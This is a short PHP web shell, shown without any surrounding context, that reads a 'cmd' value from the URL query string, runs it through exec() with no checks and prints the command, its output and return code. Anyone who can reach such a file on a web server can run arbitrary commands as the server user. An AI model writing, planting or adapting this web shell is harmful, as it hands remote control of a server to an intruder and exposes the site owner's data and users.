<?php
$cmd = $_GET['cmd'] ?? 'whoami';
$output = [];
$ret = null;
exec($cmd, $output, $ret);
echo "<pre>Command: $cmd\nOutput:\n" . implode("\n", $output) . "\nReturn code: $ret</pre>";
